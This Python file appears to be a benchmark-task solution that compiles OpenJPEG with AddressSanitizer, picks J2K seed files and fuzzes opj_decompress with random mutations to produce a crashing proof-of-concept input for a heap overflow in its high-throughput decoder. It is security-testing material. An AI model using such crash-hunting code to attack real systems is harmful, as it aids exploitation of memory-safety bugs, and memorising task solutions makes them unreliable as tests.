import os
import sys
import tarfile
import tempfile
import subprocess
import shutil
import random
import struct
import time

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        """
        # Fallback minimal valid J2K seed (SOC + SIZ + COD + QCD + EOC)
        # This ensures we have something valid-ish to return if build fails
        fallback_seed = bytes.fromhex("ff4fff51002f00000000006400000064000000000000000000010000000000000001070701000000000000000000000000000000ff52000c00000001010504040001ff5c000400ffd9")

        temp_dir = tempfile.mkdtemp()
        try:
            # 1. Extract the source code
            try:
                if tarfile.is_tarfile(src_path):
                    with tarfile.open(src_path) as tar:
                        tar.extractall(path=temp_dir)
                else:
                    # If it's a directory or other format, we might fail, return fallback
                    pass
            except Exception:
                return fallback_seed

            # Locate source root (handle nested dirs)
            src_root = temp_dir
            entries = os.listdir(temp_dir)
            if len(entries) == 1 and os.path.isdir(os.path.join(temp_dir, entries[0])):
                src_root = os.path.join(temp_dir, entries[0])

            # 2. Compile OpenJPEG with ASAN
            build_dir = os.path.join(temp_dir, "build_fuzz")
            os.makedirs(build_dir, exist_ok=True)
            
            # Configure
            cmake_cmd = [
                "cmake",
                "-DCMAKE_BUILD_TYPE=RelWithDebInfo",
                "-DCMAKE_C_FLAGS=-fsanitize=address -g",
                "-DCMAKE_CXX_FLAGS=-fsanitize=address -g",
                "-DBUILD_SHARED_LIBS=OFF",
                "-DBUILD_CODEC=ON", # We need opj_decompress
                "-DBUILD_TESTING=OFF", 
                src_root
            ]
            
            try:
                subprocess.check_call(cmake_cmd, cwd=build_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                # Build only opj_decompress to save time
                subprocess.check_call(["make", "-j8", "opj_decompress"], cwd=build_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except Exception:
                # If build fails, return fallback
                return fallback_seed

            # Find the binary
            exe_path = os.path.join(build_dir, "bin", "opj_decompress")
            if not os.path.exists(exe_path):
                for r, d, f in os.walk(build_dir):
                    if "opj_decompress" in f:
                        exe_path = os.path.join(r, "opj_decompress")
                        break
            
            if not os.path.exists(exe_path):
                return fallback_seed

            # 3. Find Seeds
            # The vulnerability is in HT_DEC (High Throughput). We should prioritize seeds that might use HT.
            seeds = []
            for r, d, f in os.walk(src_root):
                for file in f:
                    if file.lower().endswith(('.j2k', '.j2c', '.jp2')):
                        full_path = os.path.join(r, file)
                        # Filter for smallish files suitable for fuzzing
                        try:
                            if os.path.getsize(full_path) < 20000:
                                seeds.append(full_path)
                        except OSError:
                            pass
            
            current_seed_data = fallback_seed
            if seeds:
                # Prioritize 'ht' seeds
                ht_seeds = [s for s in seeds if 'ht' in os.path.basename(s).lower()]
                selected_seed_path = ht_seeds[0] if ht_seeds else sorted(seeds, key=os.path.getsize)[0]
                with open(selected_seed_path, "rb") as f:
                    current_seed_data = f.read()

            # 4. Fuzzing Loop
            poc_file = os.path.join(temp_dir, "poc.j2c")
            devnull = open(os.devnull, 'wb')
            
            best_input = current_seed_data
            start_time = time.time()
            
            # Simple check if seed crashes immediately
            try:
                with open(poc_file, "wb") as f:
                    f.write(current_seed_data)
                res = subprocess.run([exe_path, "-i", poc_file, "-o", os.devnull], 
                                     stdout=devnull, stderr=subprocess.PIPE, timeout=1)
                if res.returncode != 0 and b"AddressSanitizer" in res.stderr:
                    return current_seed_data
            except Exception:
                pass

            # Fuzz for up to 90 seconds
            while time.time() - start_time < 90:
                # Mutate
                data = bytearray(current_seed_data)
                num_mutations = random.randint(1, 4)
                for _ in range(num_mutations):
                    mut_type = random.randint(0, 3)
                    idx = random.randint(0, len(data) - 1)
                    if mut_type == 0: # Flip bit
                        data[idx] ^= (1 << random.randint(0, 7))
                    elif mut_type == 1: # Random byte
                        data[idx] = random.randint(0, 255)
                    elif mut_type == 2: # Magic int
                        if idx < len(data) - 4:
                            val = random.choice([0xFFFFFFFF, 0x00000000, 0x7FFFFFFF, 0x80000000])
                            fmt = ">I" if random.random() > 0.5 else "<I"
                            try:
                                struct.pack_into(fmt, data, idx, val)
                            except: pass
                    elif mut_type == 3: # Small shuffle
                        if len(data) > 10:
                            l = random.randint(1, 8)
                            p2 = random.randint(0, len(data) - l)
                            if idx + l <= len(data) and p2 + l <= len(data):
                                tmp = data[idx:idx+l]
                                data[idx:idx+l] = data[p2:p2+l]
                                data[p2:p2+l] = tmp

                candidate = bytes(data)
                
                with open(poc_file, "wb") as f:
                    f.write(candidate)
                
                try:
                    res = subprocess.run(
                        [exe_path, "-i", poc_file, "-o", os.devnull],
                        stdout=devnull,
                        stderr=subprocess.PIPE,
                        timeout=0.5
                    )
                    
                    if res.returncode != 0:
                        err = res.stderr.decode(errors='ignore')
                        # Check for heap overflow specific to ASAN
                        if "AddressSanitizer" in err and ("heap-buffer-overflow" in err or "SEGV" in err):
                            best_input = candidate
                            break
                except subprocess.TimeoutExpired:
                    continue
                except Exception:
                    continue

            devnull.close()
            return best_input

        except Exception:
            return fallback_seed
        finally:
            shutil.rmtree(temp_dir, ignore_errors=True)
